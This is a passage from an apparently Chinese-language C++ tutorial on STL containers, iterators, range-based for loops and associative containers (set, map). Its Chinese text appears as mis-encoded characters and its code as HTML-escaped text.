ç§»åŠ¨è¿­ä»£å™¨ï¼ŒæŒ‡å‘ 30 (vector æ”¯æŒéšæœºè®¿é—®è¿­ä»£å™¨) // æ’å…¥ v.insert(it, 25); // åœ¨ 30 ä¹‹å‰æ’å…¥ 25ã€‚v: &#123;10, 20, 25, 30, 40, 50&#125; // æ³¨æ„ï¼švector æ’å…¥å¯èƒ½å¯¼è‡´è¿­ä»£å™¨å¤±æ•ˆï¼Œæœ€å¥½é‡æ–°è·å–æˆ–ä½¿ç”¨è¿”å›çš„è¿­ä»£å™¨ std::cout &lt;&lt; &quot;After insert: &quot;; for (int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; // åˆ é™¤ it = v.begin() + 1; // æŒ‡å‘ 20 v.erase(it); // åˆ é™¤ 20ã€‚v: &#123;10, 25, 30, 40, 50&#125; std::cout &lt;&lt; &quot;After erase(it): &quot;; for (int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; it = v.begin() + 1; // æŒ‡å‘ 25 std::vector&lt;int&gt;::iterator it_end = v.begin() + 3; // æŒ‡å‘ 40 (èŒƒå›´æ˜¯ [it, it_end) ) v.erase(it, it_end); // åˆ é™¤ 25, 30ã€‚v: &#123;10, 40, 50&#125; std::cout &lt;&lt; &quot;After erase(range): &quot;; for (int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; // ä½¿ç”¨ assign std::list&lt;int&gt; l = &#123;100, 200, 300&#125;; v.assign(l.begin(), l.end()); // ç”¨ list çš„å†…å®¹æ›¿æ¢ vector å†…å®¹ã€‚v: &#123;100, 200, 300&#125; std::cout &lt;&lt; &quot;After assign: &quot;; for (int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; v.clear(); // æ¸…ç©º vector std::cout &lt;&lt; &quot;After clear, size is: &quot; &lt;&lt; v.size() &lt;&lt; std::endl; // è¾“å‡º 0 return 0;&#125; 16.3.4 åŸºäºèŒƒå›´çš„ for å¾ªç¯ï¼ˆC++11ï¼‰C++11 å¼•å…¥äº†ä¸€ç§æ›´ç®€æ´ã€æ›´ä¸æ˜“å‡ºé”™çš„éå†å®¹å™¨ï¼ˆä»¥åŠå…¶ä»–æ”¯æŒ begin() å’Œ end() çš„åºåˆ—ï¼‰çš„æ–¹å¼ï¼š**åŸºäºèŒƒå›´çš„ for å¾ªç¯ (Range-based for loop)**ã€‚ è¯­æ³•: 123for ( declaration : range_expression ) &#123; // loop_statement&#125; range_expression: ä¸€ä¸ªå¯ä»¥æä¾› begin() å’Œ end() è¿­ä»£å™¨çš„å¯¹è±¡ï¼ˆå¦‚ STL å®¹å™¨ã€æ•°ç»„ã€åˆå§‹åŒ–åˆ—è¡¨ï¼Œæˆ–å®šä¹‰äº†ç›¸åº”æˆå‘˜/éæˆå‘˜å‡½æ•°çš„è‡ªå®šä¹‰ç±»å‹ï¼‰ã€‚ declaration: å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œå…¶ç±»å‹åº”ä¸ range_expression ä¸­çš„å…ƒç´ ç±»å‹å…¼å®¹ã€‚æ¯æ¬¡å¾ªç¯è¿­ä»£ï¼Œrange_expression ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ä¼šè¢«å¤åˆ¶æˆ–å¼•ç”¨åˆ°è¿™ä¸ªå˜é‡ä¸­ã€‚ å¸¸ç”¨å½¢å¼: åªè¯»è®¿é—® (æ¨è): ä½¿ç”¨ const auto&amp; é¿å…ä¸å¿…è¦çš„å¤åˆ¶ï¼Œå¹¶ç¡®ä¿ä¸ä¼šæ„å¤–ä¿®æ”¹å…ƒç´ ã€‚ 12345std::vector&lt;std::string&gt; names = &#123;&quot;Alice&quot;, &quot;Bob&quot;, &quot;Charlie&quot;&#125;;for (const auto&amp; name : names) &#123; std::cout &lt;&lt; name &lt;&lt; &quot; &quot;;&#125;// è¾“å‡º: Alice Bob Charlie ä¿®æ”¹å…ƒç´ : ä½¿ç”¨ auto&amp; è·å–å…ƒç´ çš„å¼•ç”¨ï¼Œå…è®¸åœ¨å¾ªç¯ä¸­ä¿®æ”¹å®¹å™¨å†…å®¹ã€‚ 123456789std::vector&lt;int&gt; nums = &#123;1, 2, 3, 4&#125;;for (auto&amp; num : nums) &#123; num *= 2; // å°†æ¯ä¸ªå…ƒç´ ä¹˜ä»¥ 2&#125;// nums ç°åœ¨æ˜¯ &#123;2, 4, 6, 8&#125;for (const auto&amp; num : nums) &#123; std::cout &lt;&lt; num &lt;&lt; &quot; &quot;;&#125;// è¾“å‡º: 2 4 6 8 å¤åˆ¶å…ƒç´ : ä½¿ç”¨ auto (æˆ–å…·ä½“ç±»å‹) ä¼šå°†æ¯ä¸ªå…ƒç´ å¤åˆ¶åˆ°å¾ªç¯å˜é‡ä¸­ã€‚å¯¹å¾ªç¯å˜é‡çš„ä¿®æ”¹ä¸ä¼šå½±å“å®¹å™¨ä¸­çš„åŸå§‹å…ƒç´ ã€‚ 12345678910std::vector&lt;int&gt; data = &#123;5, 10, 15&#125;;for (auto val : data) &#123; val += 1; // åªä¿®æ”¹äº†å‰¯æœ¬ valï¼Œdata ä¸å˜ std::cout &lt;&lt; val &lt;&lt; &quot; &quot;; // è¾“å‡º 6 11 16&#125;std::cout &lt;&lt; std::endl;for (const auto&amp; d : data) &#123; std::cout &lt;&lt; d &lt;&lt; &quot; &quot;; // è¾“å‡º 5 10 15 (åŸå§‹æ•°æ®æœªå˜)&#125;std::cout &lt;&lt; std::endl; åŸºäºèŒƒå›´çš„ for å¾ªç¯æå¤§åœ°ç®€åŒ–äº†éå†å®¹å™¨çš„ä»£ç ï¼Œä½¿å…¶æ›´æ˜“è¯»ã€æ›´å®‰å…¨ï¼ˆé¿å…äº†è¿­ä»£å™¨å¤±æ•ˆæˆ–ç´¢å¼•è¶Šç•Œç­‰å¸¸è§é”™è¯¯ï¼‰ã€‚ 16.4 æ³›å‹ç¼–ç¨‹æ³›å‹ç¼–ç¨‹ (Generic Programming) æ˜¯ä¸€ç§ç¼–ç¨‹èŒƒå¼ï¼Œæ—¨åœ¨ç¼–å†™ç‹¬ç«‹äºç‰¹å®šæ•°æ®ç±»å‹çš„ä»£ç ã€‚å…¶ç›®æ ‡æ˜¯åˆ›å»ºå¯é‡ç”¨çš„ç»„ä»¶ï¼ˆå¦‚å‡½æ•°æˆ–ç±»ï¼‰ï¼Œè¿™äº›ç»„ä»¶å¯ä»¥å¤„ç†å¤šç§ä¸åŒçš„æ•°æ®ç±»å‹ï¼Œè€Œæ— éœ€ä¸ºæ¯ç§ç±»å‹é‡å†™ä»£ç ã€‚C++ ä¸­çš„æ¨¡æ¿ (Templates) æ˜¯å®ç°æ³›å‹ç¼–ç¨‹çš„ä¸»è¦æœºåˆ¶ã€‚ æ ‡å‡†æ¨¡æ¿åº“ (STL) å°±æ˜¯æ³›å‹ç¼–ç¨‹æ€æƒ³çš„é›†ä¸­ä½“ç°ã€‚å®ƒé€šè¿‡æ¨¡æ¿å®šä¹‰äº†é€šç”¨çš„å®¹å™¨ã€ç®—æ³•å’Œè¿­ä»£å™¨ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨åŒæ ·çš„æ–¹å¼æ“ä½œ vector&lt;int&gt;, list&lt;string&gt; æˆ–å…¶ä»–è‡ªå®šä¹‰ç±»å‹çš„æ•°æ®ã€‚ 16.4.1 ä¸ºä½•ä½¿ç”¨è¿­ä»£å™¨STL çš„è®¾è®¡æ ¸å¿ƒæ˜¯å°†æ•°æ®å­˜å‚¨ï¼ˆå®¹å™¨ï¼‰å’Œæ•°æ®æ“ä½œï¼ˆç®—æ³•ï¼‰åˆ†ç¦»å¼€æ¥ã€‚ä½†æ˜¯ï¼Œç®—æ³•å¦‚ä½•æ‰èƒ½è®¿é—®ä¸åŒå®¹å™¨ï¼ˆå¦‚ vector, list, dequeï¼‰ä¸­çš„æ•°æ®å‘¢ï¼Ÿä¸åŒçš„å®¹å™¨å†…éƒ¨ç»“æ„å¯èƒ½å®Œå…¨ä¸åŒã€‚ è¿­ä»£å™¨ (Iterators) å°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„å…³é”®ã€‚è¿­ä»£å™¨æ˜¯ä¸€ç§æ³›åŒ–çš„æŒ‡é’ˆï¼Œå®ƒæä¾›äº†ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼æ¥éå†å®¹å™¨ä¸­çš„å…ƒç´ ï¼Œå¹¶è®¿é—®å…ƒç´ çš„å€¼ï¼Œè€Œæ— éœ€æš´éœ²å®¹å™¨çš„å†…éƒ¨å®ç°ç»†èŠ‚ã€‚ æŠ½è±¡è®¿é—®: ç®—æ³•ä¸ç›´æ¥æ“ä½œå®¹å™¨ï¼Œè€Œæ˜¯é€šè¿‡è¿­ä»£å™¨æ¥è®¿é—®å®¹å™¨ä¸­çš„å…ƒç´ èŒƒå›´ã€‚ ç»Ÿä¸€æ¥å£: æ‰€æœ‰å®¹å™¨éƒ½æä¾›ç¬¦åˆç‰¹å®šæ ‡å‡†çš„è¿­ä»£å™¨æ¥å£ï¼ˆå¦‚ begin(), end(), ++ å‰è¿›, * è§£å¼•ç”¨ï¼‰ã€‚ çµæ´»æ€§: ç®—æ³•åªéœ€è¦çŸ¥é“å¦‚ä½•ä½¿ç”¨è¿­ä»£å™¨ï¼Œå°±å¯ä»¥åº”ç”¨äºä»»ä½•æä¾›å…¼å®¹è¿­ä»£å™¨çš„å®¹å™¨ã€‚ä¾‹å¦‚ï¼Œstd::sort ç®—æ³•å¯ä»¥å¯¹ vector, deque ç”šè‡³æ™®é€šæ•°ç»„ï¼ˆé€šè¿‡æŒ‡é’ˆï¼ŒæŒ‡é’ˆä¹Ÿæ˜¯ä¸€ç§è¿­ä»£å™¨ï¼‰è¿›è¡Œæ’åºï¼Œåªè¦å®ƒä»¬æä¾›æ‰€éœ€çš„è¿­ä»£å™¨ç±»å‹ã€‚ 123456789101112131415161718192021222324252627282930313233#include &lt;vector&gt;#include &lt;list&gt;#include &lt;algorithm&gt; // for std::find#include &lt;iostream&gt;int main() &#123; std::vector&lt;int&gt; vec = &#123;1, 2, 3, 4, 5&#125;; std::list&lt;int&gt; lst = &#123;10, 20, 30, 40, 50&#125;; int arr[] = &#123;100, 200, 300, 400, 500&#125;; int value_to_find = 3; int value_to_find_list = 30; int value_to_find_arr = 300; // ä½¿ç”¨ std::find ç®—æ³•ï¼Œé€šè¿‡è¿­ä»£å™¨æ“ä½œä¸åŒå®¹å™¨ auto it_vec = std::find(vec.begin(), vec.end(), value_to_find); if (it_vec != vec.end()) &#123; std::cout &lt;&lt; &quot;Found &quot; &lt;&lt; value_to_find &lt;&lt; &quot; in vector.\\n&quot;; &#125; auto it_lst = std::find(lst.begin(), lst.end(), value_to_find_list); if (it_lst != lst.end()) &#123; std::cout &lt;&lt; &quot;Found &quot; &lt;&lt; value_to_find_list &lt;&lt; &quot; in list.\\n&quot;; &#125; // æ™®é€šæŒ‡é’ˆä¹Ÿå¯ä»¥ä½œä¸ºè¿­ä»£å™¨ä½¿ç”¨ int* it_arr = std::find(arr, arr + 5, value_to_find_arr); if (it_arr != arr + 5) &#123; std::cout &lt;&lt; &quot;Found &quot; &lt;&lt; value_to_find_arr &lt;&lt; &quot; in array.\\n&quot;; &#125; return 0;&#125; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒåŒä¸€ä¸ª std::find ç®—æ³•å¯ä»¥ä½œç”¨äº vector, list å’Œ C é£æ ¼æ•°ç»„ï¼Œå› ä¸ºå®ƒæ“ä½œçš„æ˜¯è¿­ä»£å™¨ï¼ˆæˆ–æŒ‡é’ˆï¼‰å®šä¹‰çš„èŒƒå›´ï¼Œè€Œä¸æ˜¯å®¹å™¨æœ¬èº«ã€‚ 16.4.2 è¿­ä»£å™¨ç±»å‹STL å®šä¹‰äº†äº”ç§ä¸»è¦çš„è¿­ä»£å™¨ç±»åˆ«ï¼Œå®ƒä»¬æ ¹æ®æä¾›çš„æ“ä½œèƒ½åŠ›è¿›è¡ŒåŒºåˆ†ï¼š è¾“å…¥è¿­ä»£å™¨ (Input Iterator): æœ€åŸºæœ¬çš„è¿­ä»£å™¨ï¼Œåªèƒ½å‘å‰ç§»åŠ¨ (++)ã€‚ åªèƒ½è¯»å– (*) æ‰€æŒ‡å‘çš„å…ƒç´ ä¸€æ¬¡ï¼ˆè¯»å–åå†æ¬¡è¯»å–åŒä¸€ä½ç½®çš„ç»“æœæœªå®šä¹‰ï¼‰ã€‚ æ”¯æŒæ¯”è¾ƒç›¸ç­‰ (==, !=)ã€‚ ç”¨äºå•éæ‰«æç®—æ³•ï¼Œä¾‹å¦‚ std::find, std::accumulateã€‚istream_iterator æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ è¾“å‡ºè¿­ä»£å™¨ (Output Iterator): åªèƒ½å‘å‰ç§»åŠ¨ (++)ã€‚ åªèƒ½å†™å…¥ (*it = value) æ‰€æŒ‡å‘çš„ä½ç½®ä¸€æ¬¡ã€‚ ä¸æ”¯æŒæ¯”è¾ƒã€‚ ç”¨äºå°†ç»“æœå†™å…¥ç›®æ ‡ï¼Œä¾‹å¦‚ std::copy çš„ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚ostream_iterator æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ å‰å‘è¿­ä»£å™¨ (Forward Iterator): ç»“åˆäº†è¾“å…¥å’Œè¾“å‡ºè¿­ä»£å™¨çš„éƒ¨åˆ†èƒ½åŠ›ï¼ˆä½†æ›´å¼ºï¼‰ã€‚ å¯ä»¥å‘å‰ç§»åŠ¨ (++)ã€‚ å¯ä»¥å¤šæ¬¡è¯»å– (*) åŒä¸€ä¸ªå…ƒç´ ã€‚ å¯ä»¥å¤šæ¬¡å†™å…¥ (*it = value) åŒä¸€ä¸ªå…ƒç´ ï¼ˆå¦‚æœæŒ‡å‘çš„æ˜¯é const å…ƒç´ ï¼‰ã€‚ æ”¯æŒæ¯”è¾ƒç›¸ç­‰ (==, !=)ã€‚ ç”¨äºéœ€è¦å¤šæ¬¡éå†åŒä¸€èŒƒå›´çš„ç®—æ³•ã€‚std::forward_list æä¾›å‰å‘è¿­ä»£å™¨ã€‚unordered å®¹å™¨ä¹Ÿæä¾›è‡³å°‘å‰å‘è¿­ä»£å™¨ã€‚ åŒå‘è¿­ä»£å™¨ (Bidirectional Iterator): ç»§æ‰¿äº†å‰å‘è¿­ä»£å™¨çš„æ‰€æœ‰èƒ½åŠ›ã€‚ å¢åŠ äº†å‘åç§»åŠ¨ (--) çš„èƒ½åŠ›ã€‚ std::list, std::set, std::map æä¾›åŒå‘è¿­ä»£å™¨ã€‚ éšæœºè®¿é—®è¿­ä»£å™¨ (Random Access Iterator): æœ€å¼ºå¤§çš„è¿­ä»£å™¨ï¼Œç»§æ‰¿äº†åŒå‘è¿­ä»£å™¨çš„æ‰€æœ‰èƒ½åŠ›ã€‚ æ”¯æŒç®—æœ¯è¿ç®—ï¼šit + n, it - n, it += n, it -= n (å¿«é€Ÿç§»åŠ¨åˆ°ä»»æ„ä½ç½®)ã€‚ æ”¯æŒä¸‹æ ‡è¿ç®—ï¼šit[n] (ç­‰ä»·äº *(it + n))ã€‚ æ”¯æŒæ¯”è¾ƒå¤§å° (&lt;, &gt;, &lt;=, &gt;=)ã€‚ æ”¯æŒè®¡ç®—ä¸¤ä¸ªè¿­ä»£å™¨ä¹‹é—´çš„è·ç¦» (it2 - it1)ã€‚ std::vector, std::deque, std::array, std::string æä¾›éšæœºè®¿é—®è¿­ä»£å™¨ã€‚æ™®é€šæŒ‡é’ˆä¹Ÿæ˜¯éšæœºè®¿é—®è¿­ä»£å™¨ã€‚ ç®—æ³•ä¼šæ ¹æ®å…¶éœ€è¦æŒ‡å®šå®ƒæ‰€è¦æ±‚çš„æœ€ä½è¿­ä»£å™¨ç±»åˆ«ã€‚ä¾‹å¦‚ï¼Œstd::reverse éœ€è¦åŒå‘è¿­ä»£å™¨ï¼Œè€Œ std::sort éœ€è¦éšæœºè®¿é—®è¿­ä»£å™¨ï¼ˆå› ä¸ºå®ƒéœ€è¦é«˜æ•ˆåœ°äº¤æ¢ä»»æ„ä½ç½®çš„å…ƒç´ ï¼‰ã€‚ 16.4.3 è¿­ä»£å™¨å±‚æ¬¡ç»“æ„è¿™äº”ç§è¿­ä»£å™¨ç±»å‹å½¢æˆäº†ä¸€ä¸ªå±‚æ¬¡ç»“æ„ï¼Œåé¢çš„ç±»åˆ«æ‹¥æœ‰å‰é¢ç±»åˆ«æ‰€æœ‰ï¼ˆæˆ–ç­‰ä»·ï¼‰çš„åŠŸèƒ½ï¼š 1234567Input Iterator Output Iterator \\ &#x2F; Forward Iterator | Bidirectional Iterator | Random Access Iterator è¿™æ„å‘³ç€ï¼Œå¦‚æœä¸€ä¸ªç®—æ³•éœ€è¦å‰å‘è¿­ä»£å™¨ï¼Œä½ å¯ä»¥ä¼ é€’ç»™å®ƒå‰å‘ã€åŒå‘æˆ–éšæœºè®¿é—®è¿­ä»£å™¨ã€‚ä½†å¦‚æœç®—æ³•éœ€è¦éšæœºè®¿é—®è¿­ä»£å™¨ï¼Œä½ å°±ä¸èƒ½ä¼ é€’ç»™å®ƒåŒå‘æˆ–å‰å‘è¿­ä»£å™¨ã€‚ 16.4.4 æ¦‚å¿µã€æ”¹è¿›å’Œæ¨¡å‹ (Concepts, Refinements, and Models)STL çš„è®¾è®¡åŸºäºæ¦‚å¿µ (Concepts) çš„æ€æƒ³ã€‚ä¸€ä¸ªæ¦‚å¿µæ˜¯ä¸€ç»„å¯¹ç±»å‹çš„è¦æ±‚ï¼ˆåŒ…æ‹¬ç±»å‹å¿…é¡»æä¾›çš„æ“ä½œã€ç±»å‹åˆ«åã€è¯­ä¹‰ä¿è¯ç­‰ï¼‰ã€‚ æ¦‚å¿µ (Concept): ä¾‹å¦‚ï¼Œâ€œè¿­ä»£å™¨â€æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œâ€œå¯æ’åº (Sortable)â€æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œâ€œå®¹å™¨â€æ˜¯ä¸€ä¸ªæ¦‚å¿µã€‚ æ”¹è¿› (Refinement): ä¸€ä¸ªæ¦‚å¿µå¯ä»¥æ˜¯å¦ä¸€ä¸ªæ¦‚å¿µçš„æ”¹è¿›ã€‚ä¾‹å¦‚ï¼Œâ€œå‰å‘è¿­ä»£å™¨â€æ˜¯â€œè¾“å…¥è¿­ä»£å™¨â€çš„æ”¹è¿›ï¼Œå› ä¸ºå®ƒå¢åŠ äº†å¯ä»¥å¤šæ¬¡è¯»å–çš„è¦æ±‚ã€‚â€œåŒå‘è¿­ä»£å™¨â€æ˜¯â€œå‰å‘è¿­ä»£å™¨â€çš„æ”¹è¿›ï¼Œå¢åŠ äº†å‘åç§»åŠ¨çš„è¦æ±‚ã€‚ æ¨¡å‹ (Model): ä¸€ä¸ªå…·ä½“çš„ç±»å‹å¦‚æœæ»¡è¶³äº†æŸä¸ªæ¦‚å¿µçš„æ‰€æœ‰è¦æ±‚ï¼Œå°±ç§°ä¸ºè¯¥æ¦‚å¿µçš„ä¸€ä¸ª**æ¨¡å‹ (Model)**ã€‚ä¾‹å¦‚ï¼Œstd::vector&lt;int&gt;::iterator æ˜¯â€œéšæœºè®¿é—®è¿­ä»£å™¨â€æ¦‚å¿µçš„ä¸€ä¸ªæ¨¡å‹ã€‚int ç±»å‹æ˜¯â€œå¯ç›¸åŠ  (Additive)â€æ¦‚å¿µçš„ä¸€ä¸ªæ¨¡å‹ã€‚ è™½ç„¶ C++ æ ‡å‡†æœ¬èº«ç›´åˆ° C++20 æ‰æ­£å¼å¼•å…¥è¯­è¨€çº§åˆ«çš„ Concepts æ”¯æŒï¼Œä½† STL ä»ä¸€å¼€å§‹å°±æ˜¯åŸºäºè¿™ç§æ€æƒ³è®¾è®¡çš„ã€‚ç®—æ³•çš„æ–‡æ¡£é€šå¸¸ä¼šè¯´æ˜å®ƒå¯¹æ¨¡æ¿å‚æ•°ï¼ˆç‰¹åˆ«æ˜¯è¿­ä»£å™¨ç±»å‹ï¼‰çš„æ¦‚å¿µè¦æ±‚ã€‚ä¾‹å¦‚ï¼Œstd::sort è¦æ±‚å…¶è¿­ä»£å™¨å‚æ•°æ˜¯â€œéšæœºè®¿é—®è¿­ä»£å™¨ (RandomAccessIterator)â€çš„æ¨¡å‹ï¼Œå¹¶ä¸”å…ƒç´ ç±»å‹æ˜¯â€œå¯å°äºæ¯”è¾ƒ (LessThanComparable)â€å’Œâ€œå¯ç§»åŠ¨æ„é€ /èµ‹å€¼ (MoveConstructible/MoveAssignable)â€çš„æ¨¡å‹ã€‚ ç†è§£æ¦‚å¿µæœ‰åŠ©äºæˆ‘ä»¬çŸ¥é“å“ªäº›ç®—æ³•å¯ä»¥ç”¨äºå“ªäº›å®¹å™¨æˆ–æ•°æ®ç±»å‹ã€‚ 16.4.5 å®¹å™¨ç§ç±»STL æä¾›äº†å¤šç§å®¹å™¨ç±»å‹ï¼Œå¯ä»¥å¤§è‡´åˆ†ä¸ºå‡ ç±»ï¼š é¡ºåºå®¹å™¨ (Sequence Containers): å…ƒç´ æŒ‰ç…§çº¿æ€§é¡ºåºæ’åˆ—ã€‚ std::vector: åŠ¨æ€æ•°ç»„ï¼Œè¿ç»­å†…å­˜ï¼Œéšæœºè®¿é—®å¿«ï¼Œå°¾éƒ¨æ’å…¥/åˆ é™¤å¿«ï¼Œä¸­é—´æ’å…¥/åˆ é™¤æ…¢ã€‚ std::deque (Double-Ended Queue): åŒç«¯é˜Ÿåˆ—ï¼Œéè¿ç»­å†…å­˜ï¼ˆåˆ†å—ï¼‰ï¼Œæ”¯æŒéšæœºè®¿é—®ï¼Œå¤´éƒ¨å’Œå°¾éƒ¨æ’å…¥/åˆ é™¤éƒ½å¿«ï¼Œä¸­é—´æ’å…¥/åˆ é™¤æ…¢ã€‚ std::list: åŒå‘é“¾è¡¨ï¼Œéè¿ç»­å†…å­˜ï¼Œä¸æ”¯æŒéšæœºè®¿é—®ï¼ˆè®¿é—®å…ƒç´ éœ€éå†ï¼‰ï¼Œä»»ä½•ä½ç½®æ’å…¥/åˆ é™¤éƒ½å¿« (O(1))ã€‚ std::forward_list (C++11): å•å‘é“¾è¡¨ï¼Œæ¯” list å¼€é”€æ›´å°ï¼Œåªæ”¯æŒå‘å‰éå†ï¼Œä»»ä½•ä½ç½®æ’å…¥/åˆ é™¤å¿«ã€‚ std::array (C++11): å›ºå®šå¤§å°æ•°ç»„ï¼Œæ˜¯å¯¹ C é£æ ¼æ•°ç»„çš„å°è£…ï¼Œè¿ç»­å†…å­˜ï¼Œæ”¯æŒéšæœºè®¿é—®ï¼Œå¤§å°åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œä¸èƒ½åŠ¨æ€æ”¹å˜ã€‚ å…³è”å®¹å™¨ (Associative Containers): å…ƒç´ æ ¹æ®é”® (Key) è¿›è¡Œæ’åºå’Œå­˜å‚¨ï¼ŒæŸ¥æ‰¾é€Ÿåº¦é€šå¸¸è¾ƒå¿« (å¯¹æ•°æ—¶é—´å¤æ‚åº¦ O(log N))ã€‚ std::set: å­˜å‚¨å”¯ä¸€å…ƒç´ çš„é›†åˆï¼Œè‡ªåŠ¨æ’åºã€‚ std::map: å­˜å‚¨**é”®-å€¼å¯¹ (Key-Value Pair)**ï¼Œé”®æ˜¯å”¯ä¸€çš„ï¼Œæ ¹æ®é”®è‡ªåŠ¨æ’åºã€‚ std::multiset: ç±»ä¼¼äº setï¼Œä½†å…è®¸å­˜å‚¨é‡å¤å…ƒç´ ã€‚ std::multimap: ç±»ä¼¼äº mapï¼Œä½†å…è®¸å­˜å‚¨å…·æœ‰ç›¸åŒé”®çš„å¤šä¸ªé”®-å€¼å¯¹ã€‚ æ— åºå…³è”å®¹å™¨ (Unordered Associative Containers) (C++11): å…ƒç´ æ ¹æ®é”®çš„å“ˆå¸Œå€¼ (Hash Value) å­˜å‚¨åœ¨æ¡¶ (Bucket) ä¸­ï¼Œä¸ä¿è¯å…ƒç´ é¡ºåºã€‚æ’å…¥ã€åˆ é™¤å’ŒæŸ¥æ‰¾çš„å¹³å‡æ—¶é—´å¤æ‚åº¦é€šå¸¸ä¸ºå¸¸æ•°æ—¶é—´ O(1)ï¼Œä½†æœ€åæƒ…å†µä¸‹å¯èƒ½é€€åŒ–ä¸ºçº¿æ€§æ—¶é—´ O(N)ã€‚ std::unordered_set: å­˜å‚¨å”¯ä¸€å…ƒç´ çš„å“ˆå¸Œé›†åˆã€‚ std::unordered_map: å­˜å‚¨é”®-å€¼å¯¹çš„å“ˆå¸Œæ˜ å°„ï¼Œé”®å”¯ä¸€ã€‚ std::unordered_multiset: å…è®¸é‡å¤å…ƒç´ çš„å“ˆå¸Œé›†åˆã€‚ std::unordered_multimap: å…è®¸é‡å¤é”®çš„å“ˆå¸Œæ˜ å°„ã€‚ å®¹å™¨é€‚é…å™¨ (Container Adapters): åŸºäºå…¶ä»–å®¹å™¨ç±»å‹å®ç°ç‰¹å®šæ¥å£ï¼ˆé€šå¸¸é™åˆ¶äº†åº•å±‚å®¹å™¨çš„åŠŸèƒ½ï¼‰ã€‚ std::stack: åè¿›å…ˆå‡º (LIFO) æ ˆï¼Œé»˜è®¤åŸºäº deque å®ç°ã€‚ std::queue: å…ˆè¿›å…ˆå‡º (FIFO) é˜Ÿåˆ—ï¼Œé»˜è®¤åŸºäº deque å®ç°ã€‚ std::priority_queue: ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œæœ€å¤§ï¼ˆæˆ–æœ€å°ï¼‰å…ƒç´ æ€»æ˜¯åœ¨é¡¶éƒ¨ï¼Œé»˜è®¤åŸºäº vector å®ç°ã€‚ é€‰æ‹©å“ªç§å®¹å™¨å–å†³äºå…·ä½“éœ€æ±‚ï¼Œå¦‚æ˜¯å¦éœ€è¦æ’åºã€æ˜¯å¦éœ€è¦å¿«é€Ÿéšæœºè®¿é—®ã€æ’å…¥/åˆ é™¤çš„é¢‘ç‡å’Œä½ç½®ã€æ˜¯å¦å…è®¸é‡å¤å…ƒç´ ç­‰ã€‚ 16.4.6 å…³è”å®¹å™¨å…³è”å®¹å™¨çš„æ ¸å¿ƒç‰¹ç‚¹æ˜¯å…ƒç´ æ ¹æ®é”®è‡ªåŠ¨æ’åºã€‚å®ƒä»¬é€šå¸¸ä½¿ç”¨æŸç§å½¢å¼çš„å¹³è¡¡äºŒå‰æœç´¢æ ‘ï¼ˆå¦‚çº¢é»‘æ ‘ï¼‰æ¥å®ç°ï¼Œä¿è¯äº†æ’å…¥ã€åˆ é™¤å’ŒæŸ¥æ‰¾æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸º O(log N)ã€‚ std::set&lt;Key&gt;: å­˜å‚¨ç±»å‹ä¸º Key çš„å”¯ä¸€å…ƒç´ ã€‚ å…ƒç´ è‡ªåŠ¨æŒ‰å‡åºæ’åºï¼ˆé»˜è®¤ä½¿ç”¨ operator&lt;ï¼‰ã€‚ ä¸»è¦ç”¨äºå¿«é€Ÿæ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨ã€‚ 123456789101112131415161718192021222324#include &lt;set&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::set&lt;std::string&gt; unique_words; unique_words.insert(&quot;apple&quot;); unique_words.insert(&quot;banana&quot;); unique_words.insert(&quot;apple&quot;); // é‡å¤æ’å…¥ä¼šè¢«å¿½ç•¥ std::cout &lt;&lt; &quot;Set contains: &quot;; for (const auto&amp; word : unique_words) &#123; std::cout &lt;&lt; word &lt;&lt; &quot; &quot;; // è¾“å‡º: apple banana (å·²æ’åº) &#125; std::cout &lt;&lt; std::endl; if (unique_words.count(&quot;banana&quot;)) &#123; // count() è¿”å› 0 æˆ– 1 std::cout &lt;&lt; &quot;banana is in the set.\\n&quot;; &#125; auto it = unique_words.find(&quot;cherry&quot;); // find() è¿”å›è¿­ä»£å™¨ if (it == unique_words.end()) &#123; std::cout &lt;&lt; &quot;cherry is not in the set.\\n&quot;; &#125;&#125; std::map&lt;Key, Value&gt;: å­˜å‚¨ std::pair&lt;const Key, Value&gt; ç±»å‹çš„é”®-å€¼å¯¹ã€‚ é”® Key å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚ å…ƒç´ æ ¹æ®é”®è‡ªåŠ¨æ’åºã€‚ å¯ä»¥é€šè¿‡é”®å¿«é€ŸæŸ¥æ‰¾å¯¹åº”çš„å€¼ã€‚ 12345678910111213141516171819202122232425262728293031#include &lt;map&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::map&lt;std::string, int&gt; word_counts; // æ’å…¥æ–¹å¼ word_counts.insert(&#123;&quot;apple&quot;, 3&#125;); word_counts.insert(std::make_pair(&quot;banana&quot;, 5)); word_counts[&quot;cherry&quot;] = 2; // ä½¿ç”¨ operator[] æ’å…¥æˆ–æ›´æ–° word_counts[&quot;apple&quot;] = 4; // æ›´æ–° apple çš„å€¼ std::cout &lt;&lt; &quot;Map contains:\\n&quot;; for (const auto&amp; pair : word_counts) &#123; // pair.first æ˜¯ const Key, pair.second æ˜¯ Value std::cout &lt;&lt; pair.first &lt;&lt; &quot;: &quot; &lt;&lt; pair.second &lt;&lt; std::endl; // è¾“å‡ºæŒ‰é”®æ’åº: apple: 4, banana: 5, cherry: 2 &#125; std::cout &lt;&lt; &quot;Count for banana: &quot; &lt;&lt; word_counts[&quot;banana&quot;] &lt;&lt; std::endl; // ä½¿ç”¨ [] è®¿é—® auto it = 